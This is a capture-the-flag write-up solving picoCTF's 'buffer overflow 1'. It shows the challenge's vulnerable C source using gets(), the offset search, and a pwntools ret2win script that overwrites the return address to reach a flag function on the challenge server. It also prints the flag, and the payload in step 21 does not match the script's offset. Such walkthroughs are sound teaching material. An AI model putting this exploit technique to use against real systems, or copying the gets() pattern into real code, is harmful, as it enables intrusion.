# buffer overflow 1
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Control the return address Now we're cooking! 
You can overflow the buffer and return to the flag function in the [program](https://github.com/jon-brandy/CTF-WRITE-UP/blob/4b15b8791f8a6558c6fc8bfedeba343c9ab77ec7/Asset/buffer%20overflow%201/vuln). 
You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/9cda637bea2a85da46ba8dce3c9ccf131928092f/Asset/buffer%20overflow%201/vuln.c). And connect with it using 
`nc saturn.picoctf.net 49449`.
## HINTS:
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.
## STEPS:
1. First, download both file given.
2. Next, check the program, is it executeable or not.

![image](https://user-images.githubusercontent.com/70703371/184164409-dfc35fd8-6e24-4756-832e-de899e682792.png)

3. Seems we can make it executable and nicely it's not stripped, so we can see the function.
4. But before make it executeable, let's check are there any protection on the file.
5. Run -> `checksec --file vuln`.

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/184164974-2c09f927-035a-4b92-af20-35eaeca03ca3.png)

6. Seems like there's no protection, which means there's many solutions available here.

```
WE MAY:

Do bufferoverflow
Inject shellcode
````

7. Anyway let's view the source code.

> vuln.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); 
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE]; 
  gets(buf); 

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

8. Seems like there's a vuln here.

![image](https://user-images.githubusercontent.com/70703371/187901057-afcd349f-4dfb-4a30-b46b-4df0dd29f0be.png)

9. Let's run the program and input 32 A's.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/187900683-18470f53-aee9-49e0-90e7-317b9d573753.png)

10. Well let's try 36 A's now.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/187902266-209e5aa4-6a52-483c-b8d2-5ca3ccea166d.png)

11. Try 40 now.

![image](https://user-images.githubusercontent.com/70703371/187902360-9bc7428d-07af-42c9-8763-fd016d9d4409.png)

12. We got segmentation fault, means the program just crashed. 
13. But let's try to add another 4 bytes -> 44 A's.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/187903022-47f70b6e-b9d1-4b42-842c-4a389eaa5dd7.png)

14. Again we got segmentation fault, but we jumped to different address now.
15. But when i tried to add another 4 bytes -> 48 A's, i got this output.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/187903590-68f676dc-7e25-40ee-8cd1-c80a29c7be5e.png)

16. Notice 0x41 represent -> 'A'.
17. Great now we know the point where we can control the return address.
18. Next to find the address of `win` function i used a tools called `Cutter`.

> COMMAND 

```sh
Cutter vuln
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/187904538-6031f2c6-baf6-473a-bd92-163279f77d35.png)

19. Click the `sym.win`.

![image](https://user-images.githubusercontent.com/70703371/187904668-a1c26203-81da-4ad4-afe4-0310e42c2ab5.png)

![image](https://user-images.githubusercontent.com/70703371/187904851-06d7c870-4c20-4e59-b3ea-cf2cc2b30b9e.png)

> win address

```
0x080491f6
```

20. Based from the hint number 1 about endian, we know we can't display hexa bytes like this -> `0x080491f6`. We must display it in `Little-Endian`.

> ABOUT LITTLE ENDIAN

```
https://en.wikipedia.org/wiki/Endianness
```

21. So for the strings would be like this:

```py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
```

22. For this solution i made this python script:

> SIMILIAR CONCEPT WITH RET2WIN

```py
import os
from pwn import *

os.system('clear')

sh = remote('saturn.picoctf.net', 63239)

sh.recvuntil('string: ')
p = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
sh.sendline(p)


sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/187910840-49a1e938-d23d-40b3-ab23-e8241c105c67.png)

23. Finally, we got the flag!

## FLAG

```
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```

## LEARNING REFERENCES:

```
https://en.wikipedia.org/wiki/Endianness
```

